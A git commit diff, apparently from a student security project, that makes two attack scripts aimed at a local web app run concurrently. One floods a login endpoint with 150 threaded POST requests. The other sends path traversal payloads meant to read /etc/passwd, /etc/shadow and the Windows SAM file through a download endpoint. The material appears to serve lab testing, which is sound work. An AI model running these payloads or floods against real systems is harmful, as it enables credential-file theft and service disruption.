ded4c6b56d33b9f3d05a87eb2c0fdc2d1e44bc00
KatieSusanna <up2113500@myport.ac.uk>
2026-07-21 14:28:53 +0100

    concurrency functioning

--- attack_ddos.py
+++ attack_ddos.py
@@ -1,7 +1,16 @@
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
-url = "http://127.0.0.1:5000/login"
+def run():
+    url = "http://127.0.0.1:5000/login"
 
-for i in range(150):
-    response = requests.post(url)
-    
+    # for i in range(150):
+    #     response = requests.post(url)
+        
+    session = requests.Session() 
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        for i in range(150):
+            executor.submit(session.post, url)
+
+if __name__ == "__main__":
+    run()
--- attack_traversal.py
+++ attack_traversal.py
@@ -1,19 +1,29 @@
 import requests 
+from concurrent.futures import ThreadPoolExecutor
 
-url = "http://127.0.0.1:5000/download"
-
-
-path_traversal_payloads = [
-    "../",                          
-    "../../",                       
-    "../../../etc/passwd",         
-    "../../../../../../etc/shadow", 
-    "..\\..\\windows\\system32\\config\\sam", 
-    "%2e%2e%2f%2e%2e%2f",          
-    "..%2f..%2f etc/passwd",        
-]
+def run():
+    url = "http://127.0.0.1:5000/download"
 
 
-for payload in path_traversal_payloads:
-    response = requests.get(url, params={"filename": payload})
-    print(f"Payload: {payload} | Response Code: {response.status_code}")
+    path_traversal_payloads = [
+        "../",                          
+        "../../",                       
+        "../../../etc/passwd",         
+        "../../../../../../etc/shadow", 
+        "..\\..\\windows\\system32\\config\\sam", 
+        "%2e%2e%2f%2e%2e%2f",          
+        "..%2f..%2f etc/passwd",        
+    ]
+
+    session = requests.Session()
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        for payload in path_traversal_payloads:
+            executor.submit(session.get, url, params={"filename": payload})
+
+
+    # for payload in path_traversal_payloads:
+    #     response = requests.get(url, params={"filename": payload})
+    #     print(f"Payload: {payload} | Response Code: {response.status_code}")
+
+if __name__ == "__main__":
+    run()
